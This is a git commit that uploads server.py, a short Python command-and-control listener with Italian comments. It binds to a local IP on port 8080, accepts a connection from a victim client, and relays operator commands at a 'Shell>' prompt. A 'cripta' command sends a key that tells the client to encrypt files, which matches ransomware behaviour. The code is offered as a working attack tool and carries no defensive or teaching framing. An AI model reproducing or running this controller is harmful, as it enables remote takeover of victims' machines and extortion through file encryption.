79d3f2f8a509ce469a64e1d88747c81bfb1ff3ba
Antonino Fortunato <32031277+antoninofortunato96@users.noreply.github.com>
2021-02-21 07:52:00 +0100

    Add files via upload

---
+++ server.py
@@ -0,0 +1,33 @@
+
+import socket 
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+
+s.bind(("192.168.137.1", 8080)) # indirizzo ip server
+
+s.listen(1) 
+
+print ('[+] Connessione in attesa sulla porta: 8080')
+
+conn, addr = s.accept() 
+
+print ('[+] Connessione stabilita: '), 
+
+while True:
+
+      command = input("Shell> ")
+      conn.send(command.encode())
+
+      if 'cripta' in command:
+
+          key_value=input("Inserisci chiave per criptare i files: ")
+          conn.send(key_value.encode())
+          break
+                  
+      if 'terminate' in command: # If we got terminate command, inform the client and close the connect and break the loop
+            conn.send(command.encode())
+            conn.close()
+            break
+
+     
